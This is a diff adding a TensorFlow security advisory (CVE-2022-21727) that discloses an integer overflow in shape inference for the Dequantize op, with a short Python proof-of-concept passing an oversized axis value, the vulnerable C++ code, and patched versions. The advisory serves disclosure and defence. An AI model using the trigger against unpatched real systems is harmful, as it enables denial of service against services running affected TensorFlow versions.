@@ -1,0 +1,43 @@
+<h2>TFSA-2022-004: Integer overflow in shape inference for <code>Dequantize</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-21727</p>
+<h3>Impact</h3>
+<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/ops/array_ops.cc#L3001-L3034">implementation of shape inference for <code>Dequantize</code></a> is vulnerable to an integer overflow weakness:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input = tf.constant([1,1],dtype=tf.qint32)</p>
+<p>@tf.function
+def test():
+  y = tf.raw_ops.Dequantize(
+    input=input,
+    min_range=[1.0],
+    max_range=[10.0],
+    mode='MIN_COMBINED',
+    narrow_range=False,
+    axis=2**31-1,
+    dtype=tf.bfloat16)
+  return y</p>
+<p>test()
+```</p>
+<p>The <code>axis</code> argument can be <code>-1</code> (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked, and, since the code computes <code>axis + 1</code>, an attacker can trigger an integer overflow:</p>
+<p><code>cc
+  int axis = -1;
+  Status s = c-&gt;GetAttr("axis", &amp;axis);
+  // ...
+  if (axis &lt; -1) {
+    return errors::InvalidArgument("axis should be at least -1, got ",
+                                   axis);
+  }
+  // ...
+  if (axis != -1) {
+    ShapeHandle input;
+    TF_RETURN_IF_ERROR(c-&gt;WithRankAtLeast(c-&gt;input(0), axis + 1, &amp;input));
+    // ...
+  }</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/b64638ec5ccaa77b7c1eb90958e3d85ce381f91b">b64638ec5ccaa77b7c1eb90958e3d85ce381f91b</a>.</p>
+<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.</p>
